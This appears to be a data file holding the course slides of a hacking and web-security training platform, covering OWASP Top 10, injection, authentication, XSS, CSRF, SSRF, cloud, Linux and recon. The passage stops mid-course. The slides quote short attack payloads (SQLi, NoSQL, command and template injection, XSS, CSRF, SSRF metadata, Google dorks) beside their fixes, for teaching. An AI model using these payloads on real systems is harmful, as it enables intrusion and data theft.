const S = (h, body, points, code) => {
  const slide = { h, body };
  if (points) slide.points = points;
  if (code) slide.code = code;
  return slide;
};

const CH = (title, slides) => ({ title, slides });

const B3 = () => ["Attackers do this for real — every day, at scale", "One small change in code can stop an entire class of bugs", "You'll practice this exact technique in the labs"];

export const levels = [
  { level: 1, name: "Foundation", note: "HTTP, Linux, networking, recon" },
  { level: 2, name: "Web Exploitation Core", note: "OWASP Top 10, injection, access control" },
  { level: 3, name: "Advanced Web & APIs", note: "XSS, CSRF, APIs, exploitation, CTF" },
  { level: 4, name: "Platforms & Post-Exploitation", note: "Cloud, Windows/AD, blue team, pivoting" },
  { level: 5, name: "Expert & Enterprise", note: "Red team chains, forensics, realistic labs" },
];

export const paths = [
  {
    id: "web-fundamentals",
    title: "Web Security Fundamentals",
    emoji: "🌐",
    level: 1,
    tagline: "The browser, the protocol, and the request every attack starts from.",
    description: "Before breaking things you must understand the plumbing. HTTP, cookies, sessions, headers and the same-origin model are the foundation of every exploit you'll write.",
    courses: [
      {
        id: "web:http",
        title: "HTTP & HTTPS",
        icon: "🔄",
        minutes: 8,
        owasp: "Foundation",
        skills: ["http"],
        chapters: [
          CH("The request", [
            S("Every web app speaks HTTP", "A browser sends a request; a server sends a response. The request is just text with a method, a path, and headers.", ["GET /login HTTP/1.1", "Methods: GET (read), POST (create), PUT/PATCH (update), DELETE (remove)", "Headers carry cookies, content type, and more"]),
            S("The response", "The server answers with a status code and a body.", ["2xx success, 3xx redirects, 4xx client errors, 5xx server errors", "200 OK, 301 moved, 401 unauth, 403 forbidden, 500 crash", "You will read these codes constantly as a hunter"]),
          ]),
          CH("HTTPS & trust", [
            S("Why HTTPS matters", "HTTPS encrypts the whole conversation with TLS so nobody on the network can read or rewrite it.", ["Without it, a cafe WiFi attacker sees every password", "A padlock in the URL bar means the connection is encrypted", "It also proves you're talking to the real server"]),
          ]),
        ],
      },
      {
        id: "web:lifecycle",
        title: "Request/Response Lifecycle",
        icon: "🧵",
        minutes: 6,
        skills: ["lifecycle"],
        chapters: [
          CH("Full journey", [
            S("Type a URL, what happens?", "DNS resolves the name, TCP connects, TLS negotiates, the request travels, the server processes and replies, the browser renders.", ["DNS turns cyberwolf.dev into an IP address", "Every hop adds latency — and opportunities for inspection", "Burp and browser dev tools let you watch every step"]),
            S("Where attacks live", "Each layer can be abused: DNS (spoofing), TLS (stripping), the app (injection), the browser (XSS).", B3),
          ]),
        ],
      },
      {
        id: "web:cookies-sessions",
        title: "Cookies & Sessions",
        icon: "🍪",
        minutes: 9,
        skills: ["cookies", "sessions"],
        chapters: [
          CH("Cookies", [
            S("What a cookie is", "A tiny piece of state the server stores in the browser, sent back with every request to that domain.", ["Set-Cookie in the response, Cookie header in the next request", "Attributes: HttpOnly (JS can't read), Secure (HTTPS only), SameSite (CSRF defence)", "Cookies are NOT secrets you should trust — our bank lab proves it"]),
          ]),
          CH("Sessions", [
            S("How sessions work", "The server keeps a session store; the browser keeps only the session id cookie.", ["Sessions fix the state problem — HTTP itself is stateless", "Steal the id = steal the session (session hijacking)", "Fix: rotate ids after login, expire them, use HttpOnly + Secure"]),
          ]),
        ],
      },
      {
        id: "web:jwt",
        title: "JWT Authentication",
        icon: "🎫",
        minutes: 9,
        skills: ["jwt"],
        chapters: [
          CH("Anatomy", [
            S("Three base64 parts", "A JWT is header.payload.signature — a signed bundle of claims the server can verify without a session store.", ["header: algorithm + type", "payload: claims like sub, role, exp", "signature: prevents tampering IF the secret is strong and the algorithm isn't confused"]),
          ]),
          CH("JWT attacks", [
            S("How they get broken", "alg:none, weak secrets, and algorithm confusion are the classics.", ["Change alg to 'none' — some servers skip verification", "Brute-force weak secrets like 'secret' or 'password'", "alg:RS256→HS256 lets you sign with the public key — the key takes the secret's place"]),
            S("How to fix", "Use a modern library, enforce a whitelist of algorithms, use long random secrets, and never put trust data (role) where the client can flip it.", ["Reject alg:none outright", "Keep keys out of code and logs", "Validate exp, iss and aud claims"]),
          ]),
        ],
      },
      {
        id: "web:headers-rest",
        title: "Headers, REST APIs & Forms",
        icon: "🧰",
        minutes: 8,
        skills: ["headers", "rest", "forms"],
        chapters: [
          CH("Headers", [
            S("The envelope of the request", "Headers control caching, security, and content type.", ["Security headers: CSP, X-Frame-Options, HSTS, X-Content-Type-Options", "A missing header is a misconfiguration — OWASP A05", "Server headers can leak versions attackers love"]),
          ]),
          CH("REST APIs & forms", [
            S("JSON in, JSON out", "APIs expose resources over HTTP; forms are the old-school POST interface.", ["Broken Object Level Authorization (BOLA) is the #1 API bug", "APIs are everywhere: SPAs, mobile apps, IoT — all attack surface", "Your labs are exactly these: API + browser"]),
          ]),
        ],
      },
      {
        id: "web:sameorigin-cors",
        title: "Same-Origin Policy & CORS",
        icon: "🚧",
        minutes: 8,
        skills: ["sameorigin", "cors"],
        chapters: [
          CH("Same-Origin Policy", [
            S("The browser's firewall", "JavaScript on one origin may not read responses from another origin.", ["Origin = scheme + host + port", "http://a.com and https://a.com are different origins", "This is the LAST line of defence against cross-site data theft"]),
          ]),
          CH("CORS mistakes", [
            S("Loosening the rules safely", "CORS lets a server say 'this origin may read my data'. Misconfiguring it removes the firewall.", ["Access-Control-Allow-Origin: * with credentials = disaster", "Reflecting any Origin header + credentials = disaster", "Fix: explicit allow-list, never reflect, credentials never with *"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "owasp-top10",
    title: "OWASP Top 10",
    emoji: "🏆",
    level: 2,
    tagline: "The ten bug classes that matter most — the core learning path.",
    description: "The OWASP Top 10 is the industry's consensus ranking of web security risk. Master all ten and you can recognize most real-world breaches. Each item below is a full course with labs to match.",
    featured: true,
    courses: [
      {
        id: "owasp:a01",
        title: "A01 Broken Access Control",
        icon: "🚪",
        minutes: 9,
        owasp: "A01:2025",
        roomId: "idor",
        skills: ["access-control"],
        chapters: [
          CH("What it is", [
            S("The #1 web risk", "Users can act outside their permissions: reading others' objects, escalating roles, or browsing hidden pages.", ["IDOR, forced browsing, privilege escalation, role tampering", "Server checks 'logged in?' but not 'allowed for THIS object?'", "Fix: deny-by-default, object-level checks, enforce everywhere"]),
          ]),
          CH("Exploit pattern", [
            S("Change the number", "Change /invoice?id=1042 to 1041 and read another customer's record.", ["That's the NovaBank lab — our easiest first flag", "Sequential ids make it trivial to enumerate", "Same pattern hits accounts, files, orders"]),
          ]),
        ],
      },
      {
        id: "owasp:a02",
        title: "A02 Cryptographic Failures",
        icon: "🔐",
        minutes: 7,
        owasp: "A02:2025",
        skills: ["crypto"],
        chapters: [
          CH("What it is", [
            S("Weak or missing crypto", "Sensitive data exposed through bad encryption, hashing, or random-number choices.", ["Storing passwords as MD5 or plaintext = game over", "Weak TLS, no encryption at rest", "Even strong crypto is useless if keys are hardcoded"]),
          ]),
          CH("Fix", [
            S("Use modern primitives", "Argon2/bcrypt/scrypt for passwords, AES-256 for data, strong random generators.", ["Never invent your own crypto", "Use TLS everywhere, HSTS too", "Rotate and protect keys — an attacker reads code"]),
          ]),
        ],
      },
      {
        id: "owasp:a03",
        title: "A03 Injection",
        icon: "💉",
        minutes: 12,
        owasp: "A03:2025",
        roomId: "sqli",
        skills: ["injection"],
        chapters: [
          CH("The class", [
            S("Untrusted input becomes code", "SQL, NoSQL, LDAP, OS commands, templates — if input is concatenated into an interpreter, you're injectable.", ["SQLi is the poster child", "Command injection executes OS commands", "SSTI (template injection) can give full RCE"]),
          ]),
          CH("Exploit + fix", [
            S("Break the quote", "' OR '1'='1 bypasses a login; UNION SELECT dumps tables.", ["That's exactly the ShopLift lab", "Blind and time-based variants extract data one bit at a time"]),
            S("Fix", "Prepared statements separate data from code; validate input; least-privilege DB accounts.", ["Never concatenate input into queries", "WAFs are not a fix — they're a speed bump"]),
          ]),
        ],
      },
      {
        id: "owasp:a04",
        title: "A04 Insecure Design",
        icon: "📐",
        minutes: 6,
        owasp: "A04:2025",
        skills: ["design"],
        chapters: [
          CH("What it is", [
            S("The architecture is the bug", "Flaws in design — missing threat models, trust boundaries, or rate limits — before a line of code is written.", ["No rate limiting on login = brute-force playground", "Trusting the client for state (remember the cookie bank)", "Fix with threat modeling in the SDLC — see our SDLC path"]),
          ]),
        ],
      },
      {
        id: "owasp:a05",
        title: "A05 Security Misconfiguration",
        icon: "⚙️",
        minutes: 6,
        owasp: "A05:2025",
        skills: ["misconfig"],
        chapters: [
          CH("What it is", [
            S("The app ships insecure by default", "Default creds, verbose errors, exposed directories, missing security headers.", ["admin/admin on a fresh install", "Stack traces leaking SQL to users", "Fix: hardened templates, minimal defaults, auto-security-scans"]),
          ]),
        ],
      },
      {
        id: "owasp:a06",
        title: "A06 Vulnerable & Outdated Components",
        icon: "🧩",
        minutes: 7,
        owasp: "A06:2025",
        skills: ["components"],
        chapters: [
          CH("What it is", [
            S("You ship everyone else's code", "Known-vulnerable libraries are the software supply chain's biggest hole — think Log4Shell.", ["CVEs in dependencies, sometimes years old", "You can't fix what you don't know about", "Fix: SBOM, patching cadence, remove unused deps"]),
            S("The supply-chain lab", "Our Springfield High playground is built around this: a third-party plugin with a vulnerable logging library.", ["The vendor, not the school, was the weak link", "One trusted dependency became the whole breach"]),
          ]),
        ],
      },
      {
        id: "owasp:a07",
        title: "A07 Authentication Failures",
        icon: "🔑",
        minutes: 8,
        owasp: "A07:2025",
        skills: ["authn"],
        chapters: [
          CH("What it is", [
            S("Identity that doesn't hold", "Weak passwords, credential stuffing, MFA bypass, session fixation.", ["The staff login lab: a password posted on a public message board", "Brute force when there's no rate limiting", "Fix: MFA, strong password policy, secure reset flows"]),
          ]),
        ],
      },
      {
        id: "owasp:a08",
        title: "A08 Software & Data Integrity Failures",
        icon: "🧾",
        minutes: 7,
        owasp: "A08:2025",
        skills: ["integrity"],
        chapters: [
          CH("What it is", [
            S("Code or data that was tampered with", "Insecure deserialization, unsigned updates, untrusted CI pipelines.", ["CI/CD pipeline compromise = code injection everywhere", "Unsigned software updates = malicious installs", "Fix: sign artifacts, verify integrity, never trust unsanitized serialized data"]),
          ]),
        ],
      },
      {
        id: "owasp:a09",
        title: "A09 Logging & Monitoring Failures",
        icon: "📡",
        minutes: 6,
        owasp: "A09:2025",
        skills: ["logging"],
        chapters: [
          CH("What it is", [
            S("You never saw it coming", "Breaches go undiscovered for months because nobody logs, alerts, or reviews.", ["Attacker lives inside for 200+ days on average", "Fix: log auth events and admin actions, alert on anomalies", "The blue-team path covers SIEM and detection in depth"]),
          ]),
        ],
      },
      {
        id: "owasp:a10",
        title: "A10 Server-Side Request Forgery",
        icon: "🌐",
        minutes: 8,
        owasp: "A10:2025",
        skills: ["ssrf"],
        chapters: [
          CH("What it is", [
            S("The server fetches attacker-chosen URLs", "A URL parameter makes the server request internal services it shouldn't expose.", ["SSRF hits cloud metadata: http://169.254.169.254 gives cloud keys", "It pivots from 'external only' into the internal network", "Our SSRF lab simulates exactly this"]),
          ]),
          CH("Fix", [
            S("Restrict the fetches", "Allow-list destinations, validate schemas/hosts, disable redirects, segment networks.", ["Never pass raw user URLs to server-side requests", "Metadata endpoints should be firewalled and require tokens", "Split egress: only proxies reach internal nets"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "injection",
    title: "Injection Attacks",
    emoji: "💉",
    level: 2,
    tagline: "Every way untrusted input becomes an interpreter instruction.",
    description: "SQLi is just the beginning. This path covers the whole injection family — blind and time-based SQLi, NoSQL, LDAP, command, template and CRLF injection.",
    courses: [
      {
        id: "inj:sqli",
        title: "SQL Injection (classic)",
        icon: "🐘",
        minutes: 12,
        roomId: "sqli",
        skills: ["sqli"],
        chapters: [
          CH("How queries break", [
            S("Concatenation = injection", "Input lands inside the query string, so quotes in the input change the SQL itself.", ["' OR '1'='1 bypasses auth (our ShopLift lab)", "UNION SELECT exfiltrates whole tables", "Error messages that show raw SQL are a gift to attackers"]),
          ]),
        ],
      },
      {
        id: "inj:blind",
        title: "Blind & Time-Based SQLi",
        icon: "🦯",
        minutes: 10,
        skills: ["blind-sqli"],
        chapters: [
          CH("No output? Still leaking", [
            S("Boolean blind", "When the app prints nothing, ask yes/no questions one bit at a time.", ["' AND 1=1 true, ' AND 1=2 false → binary oracle", "Extract a database one character at a time", "Automate with sqlmap — but learn it by hand first"]),
            S("Time-based", "When even true/false is hidden, use delays: IF(condition, SLEEP(5), 0).", ["Response time is your answer channel", "Slow, loud, but works on almost everything", "Watch for WAITFOR DELAY on SQL Server"]),
          ]),
        ],
      },
      {
        id: "inj:nosql",
        title: "NoSQL Injection",
        icon: "🍃",
        minutes: 8,
        skills: ["nosql"],
        chapters: [
          CH("MongoDB & friends", [
            S("Operators instead of quotes", "JSON query objects accept operator keys like $ne, $gt, $where.", ["{\"user\":{\"$ne\":null}} bypasses logins", "The classic $where allows JavaScript execution", "Fix: validate input types, never pass raw query objects"]),
          ]),
        ],
      },
      {
        id: "inj:command",
        title: "Command Injection",
        icon: "⌨️",
        minutes: 8,
        skills: ["command-inj"],
        chapters: [
          CH("Input becomes an OS command", [
            S("The ping lab", "A ping tool that appends your input to a shell command is game over.", ["; id or && whoami runs alongside the command", "It's RCE — the highest-impact injection", "Fix: never shell out with user input; allow-list characters"]),
          ]),
        ],
      },
      {
        id: "inj:template",
        title: "Template & CRLF Injection",
        icon: "🎭",
        minutes: 8,
        skills: ["ssti", "crlf"],
        chapters: [
          CH("SSTI", [
            S("Server-side template injection", "User input rendered through a template engine (Jinja2, Twig) can execute code.", ["{{7*7}} returns 49 → you've found it", "Deep payloads reach __class__ and RCE", "Fix: render user data as DATA, never as templates"]),
          ]),
          CH("CRLF", [
            S("Sneaking newlines into headers", "An encoded newline lets you inject response headers or split responses.", ["%0d%0a starts a new header line", "Used to poison caches or smuggle content", "Fix: reject/sanitize CR and LF in header values"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "authentication",
    title: "Authentication",
    emoji: "🔐",
    level: 2,
    tagline: "Identity, sessions and every way attackers take them over.",
    description: "Weak passwords, brute force, credential stuffing, MFA bypass, JWT attacks, session fixation and cookie security — the whole identity attack surface.",
    courses: [
      {
        id: "auth:weak",
        title: "Weak Passwords & Brute Force",
        icon: "🔢",
        minutes: 8,
        skills: ["brute-force"],
        chapters: [
          CH("Guessable by design", [
            S("Humans are the weak link", "Password123, Summer2024!, admin/admin — the staff login lab is built on exactly this.", ["Rate limiting is the difference between guessing and stealing", "Password spraying: one password, many users, stays under the radar", "Fix: MFA, breach-checked passwords, rate limits + lockouts"]),
          ]),
        ],
      },
      {
        id: "auth:credential",
        title: "Credential Stuffing",
        icon: "♻️",
        minutes: 6,
        skills: ["stuffing"],
        chapters: [
          CH("Reused passwords", [
            S("One leak, everywhere", "Breached password lists get replayed against every site; people reuse passwords.", ["Millions of credentials in public breach dumps", "This is why email+password reuse is fatal", "Fix: MFA everywhere, breach monitoring, passkeys"]),
          ]),
        ],
      },
      {
        id: "auth:mfa",
        title: "MFA Bypass",
        icon: "🧬",
        minutes: 7,
        skills: ["mfa"],
        chapters: [
          CH("Past the second factor", [
            S("MFA isn't magic", "Phishing sessions, backup-code reuse, push fatigue, and missing MFA on recovery flows all bypass it.", ["Attacker triggers dozens of push prompts until the user gives in", "Fix: number-matching push, hardware keys, MFA on password reset"]),
          ]),
        ],
      },
      {
        id: "auth:session",
        title: "Session Fixation & Hijacking",
        icon: "👤",
        minutes: 8,
        skills: ["session-attacks"],
        chapters: [
          CH("Stealing the identity", [
            S("Fixation", "Attacker sets your session id before you log in, then steals the authenticated session.", ["Server accepts a client-chosen session id", "Fix: always regenerate the id on login"]),
            S("Hijacking", "Steal the session cookie via XSS (no HttpOnly) or network sniffing (no Secure).", ["Set HttpOnly so JavaScript can't read the cookie", "Set Secure so it only travels over TLS", "Our cookie-forgery bank lab shows what trusting cookies costs"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "access-control",
    title: "Access Control",
    emoji: "🚪",
    level: 2,
    tagline: "Who may touch which object — and what happens when nobody checks.",
    description: "IDOR, forced browsing, privilege escalation, role manipulation, mass assignment and parameter tampering — the mechanics of broken access control.",
    courses: [
      {
        id: "ac:idor",
        title: "IDOR & Forced Browsing",
        icon: "🔎",
        minutes: 9,
        roomId: "idor",
        skills: ["idor"],
        chapters: [
          CH("Direct references", [
            S("Guessable ids", "Sequential ids in URLs are enumerable; hidden pages are findable.", ["Change 1042 → 1041 in NovaBank and read a stranger's invoice", "Forced browsing: crawl for /admin, /backup.zip, .git", "Fix: object-level authorization + UUIDs"]),
          ]),
        ],
      },
      {
        id: "ac:priv",
        title: "Privilege Escalation",
        icon: "🪜",
        minutes: 8,
        skills: ["privesc"],
        chapters: [
          CH("Getting more than you should", [
            S("Horizontal vs vertical", "Horizontal = a peer's data; vertical = admin.", ["Changing role in a cookie = vertical (the bank lab)", "Vulnerable admin endpoints callable by anyone", "Fix: server-side role enforcement, never trust client claims"]),
          ]),
        ],
      },
      {
        id: "ac:massassign",
        title: "Mass Assignment & Parameter Tampering",
        icon: "🧬",
        minutes: 7,
        skills: ["mass-assignment"],
        chapters: [
          CH("Model binding gone wrong", [
            S("Extra fields", "Framework binds every submitted field to the model — including isAdmin if you didn't allow-list it.", ["Send role:admin in a POST body", "Fix: explicit allow-lists of writable fields"]),
            S("Tampering", "Prices, totals and step numbers arrive from the client — edit them.", ["The fee-tampering step in our school playground", "Fix: compute totals server-side, validate state transitions"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "client-side",
    title: "Client-Side Security",
    emoji: "🖥️",
    level: 3,
    tagline: "XSS, CSRF, clickjacking, CORS, CSP and browser storage.",
    description: "The browser is the battlefield. Learn reflected, stored and DOM XSS, plus CSRF, clickjacking and the headers that defend against them.",
    courses: [
      {
        id: "client:xss",
        title: "Cross-Site Scripting (XSS)",
        icon: "🧨",
        minutes: 12,
        skills: ["xss"],
        chapters: [
          CH("Three flavours", [
            S("Reflected", "The payload lives in the URL and executes in the victim's browser when they click it.", ["?q=<script>alert(1)</script>", "Delivered via phishing links"]),
            S("Stored", "The payload is saved on the server and runs for everyone — the clinic appointment-notes lab.", ["A comment, profile field or note box", "The most dangerous: it hits staff and admins too"]),
            S("DOM", "The payload never reaches the server — JavaScript reads location and writes it into innerHTML.", ["inject via location.hash or query string", "Blind spots: source → sink in client code"]),
          ]),
          CH("Impact & fixes", [
            S("Why it matters", "Steal cookies, capture keystrokes, change pages, perform actions as the victim.", ["Read localStorage/sessionStorage secrets", "Become the logged-in admin"]),
            S("Fix", "Encode all output, use textContent over innerHTML, apply a Content-Security-Policy.", ["CSP blocks script sources — defence in depth", "HttpOnly keeps cookies out of JS reach"]),
          ]),
        ],
      },
      {
        id: "client:csrf",
        title: "CSRF",
        icon: "🔄",
        minutes: 8,
        skills: ["csrf"],
        chapters: [
          CH("Forged requests", [
            S("The browser is the weapon", "If a site trusts cookies alone, any page can make the browser POST on your behalf — the bank image-email lab.", ["<img src=\"/transfer?to=attacker&amt=999\"> fires GET", "Hidden forms fire POST", "Fix: anti-CSRF tokens, SameSite cookies, double-submit cookies"]),
          ]),
        ],
      },
      {
        id: "client:clickjacking",
        title: "Clickjacking",
        icon: "👆",
        minutes: 6,
        skills: ["clickjacking"],
        chapters: [
          CH("Invisible buttons", [
            S("You click, you lose", "An attacker's page iframes your target site, transparent, on top of a tempting button.", ["User's clicks land on the victim site's actions", "Fix: X-Frame-Options: DENY or CSP frame-ancestors"]),
          ]),
        ],
      },
      {
        id: "client:storage",
        title: "Local & Session Storage",
        icon: "📦",
        minutes: 6,
        skills: ["storage"],
        chapters: [
          CH("What's in the browser", [
            S("Convenient but dangerous", "localStorage survives restarts, sessionStorage dies with the tab — and XSS can read both.", ["Never store JWTs in localStorage if HttpOnly cookies can work", "Token in localStorage = any XSS steals your session", "Fix: prefer HttpOnly cookies; if you must, keep tokens short-lived"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "api-security",
    title: "API Security",
    emoji: "🔌",
    level: 3,
    tagline: "BOLA, excessive data exposure, rate limiting and GraphQL.",
    description: "APIs are the most exposed layer in modern apps. Learn the OWASP API Top 10 essentials: object-level authorization, mass data exposure, rate limiting and key handling.",
    courses: [
      {
        id: "api:bola",
        title: "BOLA & Broken Authorization",
        icon: "🎯",
        minutes: 8,
        skills: ["bola"],
        chapters: [
          CH("The #1 API bug", [
            S("Object-level authz", "Every endpoint must verify the caller owns the requested object — the health-records lab is pure BOLA.", ["/api/patient/2001 → 2002 reads someone else", "Fix: check ownership in every handler, use UUIDs"]),
          ]),
        ],
      },
      {
        id: "api:data-exposure",
        title: "Excessive Data Exposure & Rate Limiting",
        icon: "📤",
        minutes: 7,
        skills: ["data-exposure", "rate-limit"],
        chapters: [
          CH("Too much response", [
            S("Return what's needed", "APIs that dump the whole row leak password hashes and internals.", ["response.json(user) with every column", "Fix: DTOs — explicit response shapes"]),
            S("No limits", "Without rate limiting, enumeration and brute force run at full speed.", ["Scan a million account numbers in minutes", "Fix: rate limit per user and per IP, add backoff"]),
          ]),
        ],
      },
      {
        id: "api:graphql",
        title: "GraphQL & API Keys",
        icon: "🧬",
        minutes: 8,
        skills: ["graphql"],
        chapters: [
          CH("GraphQL attacks", [
            S("One endpoint, infinite queries", "Introspection exposes the whole schema; batching and nested queries amplify to DoS.", ["Introspection query reveals every type and field", "Fix: disable introspection in prod, depth limiting, cost analysis"]),
            S("API keys", "Keys in URLs, code, or git history get leaked and abused.", ["Scan for keys before committing", "Rotate and scope keys by permission"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "cloud-security",
    title: "Cloud Security",
    emoji: "☁️",
    level: 4,
    tagline: "IAM, S3, containers, Kubernetes and secrets.",
    description: "Cloud breaches are configuration breaches. Understand IAM, storage misconfigurations, containers and K8s — and how SSRF escalates into cloud compromise.",
    courses: [
      {
        id: "cloud:iam",
        title: "IAM & Secret Management",
        icon: "🪪",
        minutes: 8,
        skills: ["iam"],
        chapters: [
          CH("Identity in the cloud", [
            S("The permission model", "IAM grants are the whole security story — least privilege, no wildcard *, role separation.", ["An overly-broad role is one leaked key away from full breach", "Cloud metadata (169.254.169.254) is the classic SSRF target", "Fix: short-lived credentials, scoped roles, secret managers"]),
          ]),
        ],
      },
      {
        id: "cloud:s3",
        title: "Storage Misconfiguration",
        icon: "🗄️",
        minutes: 7,
        skills: ["s3"],
        chapters: [
          CH("Public buckets", [
            S("World-readable data", "S3/GCS buckets with permissive ACLs expose backups, users, keys — often found by scanners in minutes.", ["bucket names are guessable and indexed", "Fix: block public ACLs, enforce encryption, audit access"]),
          ]),
        ],
      },
      {
        id: "cloud:containers",
        title: "Docker & Kubernetes Basics",
        icon: "🐳",
        minutes: 9,
        skills: ["docker", "kubernetes"],
        chapters: [
          CH("Container risks", [
            S("Images & runtime", "Root containers, secrets baked into images, and registry confusion are the top mistakes.", ["Scan images for CVEs — see A06", "Never run as root, drop capabilities, read-only FS"]),
            S("Kubernetes", "K8s misconfigs: open dashboards, RBAC sprawl, secrets in plaintext configs.", ["Default service accounts with broad roles", "Fix: RBAC least privilege, network policies, audit"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "network-security",
    title: "Network Security",
    emoji: "🌐",
    level: 1,
    tagline: "TCP/IP, DNS, firewalls, proxies and how traffic moves.",
    description: "Every exploit travels the network. Understand the protocols, the perimeter devices that inspect them, and where an attacker gets in.",
    courses: [
      {
        id: "net:protocols",
        title: "TCP/IP & DNS",
        icon: "🌍",
        minutes: 8,
        skills: ["tcpip", "dns"],
        chapters: [
          CH("The stack", [
            S("Layers", "TCP/IP is a four-layer stack: link, internet, transport, application.", ["IP routes packets; TCP makes the stream reliable", "Ports tell the receiver which service: 80 HTTP, 443 HTTPS, 22 SSH", "Three-way handshake SYN → SYN-ACK → ACK — and scanning plays with it"]),
            S("DNS", "The phone book that maps names to IPs — and a huge attack surface.", ["DNS exfiltration, cache poisoning, subdomain takeover", "Recon starts here: it maps the whole estate"]),
          ]),
        ],
      },
      {
        id: "net:perimeter",
        title: "Firewalls, Proxies & Load Balancers",
        icon: "🧱",
        minutes: 7,
        skills: ["firewalls"],
        chapters: [
          CH("The devices in the path", [
            S("Perimeter control", "Firewalls filter traffic, reverse proxies front apps, load balancers spread it.", ["WAFs inspect HTTP for attack signatures", "A proxy that fetches URLs is an SSRF primitive", "None of these fix application bugs — they only filter"]),
          ]),
        ],
      },
      {
        id: "net:vpns",
        title: "VPNs & IDS/IPS",
        icon: "🛡️",
        minutes: 6,
        skills: ["vpn"],
        chapters: [
          CH("Tunnels & alarms", [
            S("VPN", "Encrypted tunnels across untrusted networks — but only as strong as their clients.", ["Split tunneling leaks traffic", "CVE-2023-46805 / CVE-2024-21887: the Ivanti VPN chain", "Fix: patch VPNs fast — they're the front door"]),
            S("IDS/IPS", "Sensors that watch for attack patterns and alert or block.", ["Signature vs anomaly detection", "The blue-team path covers them deeper"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "linux",
    title: "Linux for Hackers",
    emoji: "🐧",
    level: 1,
    tagline: "Commands, permissions, shells and services — the hunter's home turf.",
    description: "Linux is where almost every lab, server and CTF lives. Learn the commands, permissions, services and the network tools that make you dangerous.",
    courses: [
      {
        id: "linux:cli",
        title: "Commands & Bash",
        icon: "⌨️",
        minutes: 10,
        skills: ["linux"],
        chapters: [
          CH("Survival kit", [
            S("Navigate & inspect", "ls, cd, cat, grep, find, head, tail, wc — the core reading tools.", ["grep -r searches code; find / -name locates files", "| pipes between commands; > redirects output", "history, alias, and man pages are your memory"]),
            S("Processes & users", "ps, top, kill, whoami, id, sudo.", ["whoami + id answer 'who am I' — every privesc starts here", "sudo -l shows what you can run as root", "Cron jobs are a classic privesc vector"]),
          ]),
        ],
      },
      {
        id: "linux:perm",
        title: "File Permissions & SSH",
        icon: "🔏",
        minutes: 8,
        skills: ["linux-perms"],
        chapters: [
          CH("Ownership and bits", [
            S("rwx", "Permissions are user/group/other triples: r read, w write, x execute.", ["chmod 755, chown user:group", "SUID bits run with the owner's privileges — a famous privesc", "World-writable scripts + root cron = instant root"]),
            S("SSH", "The standard remote shell — keys over passwords.", ["~/.ssh/authorized_keys grants access", "Stolen or weak keys are entry points", "Watch for known_hosts and config leaks in recon"]),
          ]),
        ],
      },
      {
        id: "linux:services",
        title: "Services, Cron & Logs",
        icon: "⏱️",
        minutes: 7,
        skills: ["linux-services"],
        chapters: [
          CH("What runs where", [
            S("Services & cron", "systemctl manages services; cron schedules jobs as users.", ["A writable cron script run as root is game over", "Services run as users — a pwned service is a beachhead", "Fix: least privilege, isolate services"]),
            S("Logs", "/var/log stores everything: auth, syslog, web, bash history.", ["The blue team reads these; attackers scrub them", "bash_history reveals commands — and secrets"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "windows-security",
    title: "Windows & Active Directory",
    emoji: "🪟",
    level: 4,
    tagline: "AD, PowerShell, SMB, RDP and the enterprise attack surface.",
    description: "The enterprise runs on Windows and Active Directory. Learn the protocols attackers abuse and how domain compromise really happens.",
    courses: [
      {
        id: "win:ad",
        title: "Active Directory Basics",
        icon: "🏛️",
        minutes: 10,
        skills: ["ad"],
        chapters: [
          CH("The domain", [
            S("Central identity", "AD stores users, computers, and policies for a whole organization.", ["Kerberos tickets + LDAP lookups run everything", "The domain admin is the crown jewel", "Attackers chase lateral movement: user → admin"]),
            S("Classic attacks", "Kerberoasting, AS-REP roasting, pass-the-hash, golden tickets.", ["Kerberoasting: crack service-account hashes offline", "Fix: strong passwords for service accounts, tiered admins"]),
          ]),
        ],
      },
      {
        id: "win:powerm",
        title: "PowerShell & Services",
        icon: "🖥️",
        minutes: 8,
        skills: ["powershell"],
        chapters: [
          CH("Abuse the platform", [
            S("PowerShell", "PowerShell is both admin tool and attacker weapon (fileless execution).", ["Execution policy is a speed bump", "Logging (ScriptBlock) catches most of it — see blue team", "Tools like Mimikatz dump credentials in memory"]),
            S("SMB & RDP", "SMB shares move files (and malware); RDP is the remote desktop doorway.", ["SMBGhost/PetitPotam-style chains hit unpatched SMB", "RDP exposed to the internet gets brute-forced in hours", "Fix: patch, restrict, MFA, network segmentation"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "recon",
    title: "Reconnaissance",
    emoji: "🔍",
    level: 1,
    tagline: "Google dorking, WHOIS, DNS and GitHub recon.",
    description: "Hacking starts before the first request. Learn to map an organization from the outside with passive and active reconnaissance.",
    courses: [
      {
        id: "recon:passive",
        title: "Google Dorking & OSINT",
        icon: "🔎",
        minutes: 8,
        skills: ["google-dorking", "osint"],
        chapters: [
          CH("Search engines as tools", [
            S("Dorks", "site:, inurl:, filetype:, intitle: — search operators expose hidden files and pages.", ["site:target.com filetype:sql finds database dumps", "filetype:env, inurl:admin, passwords in pastes", "It's legal reconnaissance — information already public"]),
            S("Other OSINT", "WHOIS, the Wayback Machine, and GitHub complete the picture.", ["Wayback shows old pages and deleted files", "GitHub searches find committed secrets", "Shodan/Censys find exposed devices directly"]),
          ]),
        ],
      },
      {
        id: "recon:active",
        title: "Active Recon",
        icon: "🎯",
        minutes: 7,
        skills: ["subdomain"],
        chapters: [
          CH("Direct discovery", [
            S("Subdomains & tech", "Enumerate subdomains and fingerprint the stack before touching anything.", ["Subdomain enumeration via certificates and brute force", "WhatWeb/Wappalyzer reveal framework versions", "Every subdomain doubles the attack surface"]),
          ]),
        ],
      },
    ],
  },
  {
    id: "enumeration",
    title: "Enumeration",
    emoji: "🧭",
    level: 2,
    tagline: "Nmap, gobuster, dirsearch, nikto — map the target methodically.",
    description: "Enumeration is the difference between script-kiddie and hunter: systematically discover hosts, ports, directories and services.",
    courses: [
      {
        id: "enum:nmap",
        title: "Nmap",
        icon: "🗺️",
        minutes: 9,
        skills: ["nmap"],
        chapters: [
          CH("Port scanning", [
